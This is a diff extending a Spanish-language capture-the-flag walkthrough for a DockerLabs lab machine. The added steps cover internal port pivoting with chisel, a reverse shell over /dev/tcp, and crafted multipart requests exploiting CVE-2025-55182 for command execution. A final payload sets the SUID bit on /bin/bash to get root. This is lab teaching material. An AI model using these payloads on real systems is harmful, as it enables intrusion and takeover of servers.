@@ -1,4 +1,3 @@
-
 ### Autoescuela-DockerLabs🇪🇸
 
 #### 1. Primero debemos de descomprimir el archivo y lo moveremos a nuestra zona de trabajo.
@@ -125,7 +124,134 @@ exec('({}).require("child_process").execSync("bash -c \'bash -i >& /dev/tcp/172.
 <img width="771" height="222" alt="image" src="https://github.com/user-attachments/assets/9e361e22-c06c-48e2-b8dd-b6557e374efd" />
 
 
-#### 7. 
+#### 7. Ahora veremos cuantos servicios están escuchando internamente.
+```bash
+netstat -tuln
+```
+
+<img width="860" height="138" alt="image" src="https://github.com/user-attachments/assets/0bb0500f-ff9f-4e18-bc5b-6dabf20e814d" />
+
+
+#### 8. Vamos a utilizar el expoit chissel. https://github.com/jpillora/chisel/releases
+
+##### 8.1 Lo prepararemos.
+```bash
+# Descomprimir
+gunzip -d chisel_1.11.5_linux_amd64.gz
+
+# Dar permisos
+chmod +x chisel_1.11.5_linux_amd64
+
+#Renombrar 
+mv chisel_1.11.5_linux_amd64 Chisel
+```
+
+<img width="913" height="92" alt="image" src="https://github.com/user-attachments/assets/176f1e63-618c-4e26-a558-739c62084e33" />
+
+
+#### 8.2 Vamos a compartir el ejecutivo a nuestra máquina 
+```bash
+ sudo python3 -m http.server 80
+```
+
+<img width="811" height="138" alt="image" src="https://github.com/user-attachments/assets/be3e53f1-99fb-4985-82d8-a1d158c1ba2d" />
+
+
+#### 8.3 Desde la reverse shell debemos de recibir el paquete.
+```bash
+cd /tmp
+curl -O http://172.17.0.1:8080/chisel
+```
+
+<img width="926" height="585" alt="image" src="https://github.com/user-attachments/assets/35cb38cb-a200-4ad5-a6b2-fce7f4f2a1c5" />
+
+
+#### 8.4 Ahora le daremos permisos
+```bash
+chmod +x chisel
+```
+
+<img width="620" height="60" alt="image" src="https://github.com/user-attachments/assets/2491c11e-7fb2-42a9-a489-0c82a2cb5b06" />
+
+
+#### 8.5 Ahora lanzamos el paquete a la escucha desde la máquina.
+```bash
+# en kali
+ ./Chisel server -p 9000 --reverse
+
+# en webuser
+./chisel client 172.17.0.1:9000 R:3001:127.0.0.1:3000
+```
+
+<img width="914" height="709" alt="image" src="https://github.com/user-attachments/assets/534ec445-c2e6-4921-8d6f-9295c34bb9aa" />
+
+
+#### 8.6 De está manera podremos interactuar directamente en la web.
+
+<img width="1019" height="637" alt="image" src="https://github.com/user-attachments/assets/6c06b2a7-d276-47ed-b836-1dd5e6150c60" />
+
+
+#### 8.7 Utilizaremos us exploit creado por un tercero. 
+**https://github.com/Alejandro609x/JEFAZO-CVE-2025-55182-Checker**
+```bash
+python3 Scan_cve_2025_55182.py 
+# http://127.0.0.1:3001/ 
+```
+
+<img width="932" height="999" alt="image" src="https://github.com/user-attachments/assets/3e62a193-3ec7-4454-b8ae-9ab25b000588" />
+
+
+ #### 8.8  Procedemos a enviar solicitudes manipuladas en el curl.
+ ```bash
+curl -X POST http://localhost:3001/ \
+     -H "Content-Type: multipart/form-data; boundary=----Boundary" \
+     -H "Next-Action: test" \
+     -H "Accept: text/x-component" \
+     --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'id\').toString()","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------Boundary--\r\n'
+```
+
+<img width="912" height="262" alt="image" src="https://github.com/user-attachments/assets/6beea58d-4ecb-4846-991c-31f7bb8d11a7" />
+
+
+#### 8.9 Nos hemos preparado el terreno para convertirnos en Root permanente dentro del contenedor.
+```bash
+# en una terminal kali
+echo "bash -p -i >& /dev/tcp/172.17.0.1/4446 0>&1" | base64
+nc -lvnp 4446
+
+# en kali terminal otra
+
+curl -X POST http://localhost:3001/ \
+  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
+  -H "Next-Action: test" \
+  -H "Accept: text/x-component" \
+  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'chmod u+s /bin/bash\').toString()","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------Boundary--\r\n'
+```
+
+<img width="899" height="794" alt="image" src="https://github.com/user-attachments/assets/ee2b246a-528b-4c47-ac00-72027508dd5a" />
+
+
+### Conseguimos la ROOT Flag.
+
+<img width="924" height="226" alt="image" src="https://github.com/user-attachments/assets/0865f92d-a27f-45b3-afb9-fece66c3a71f" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
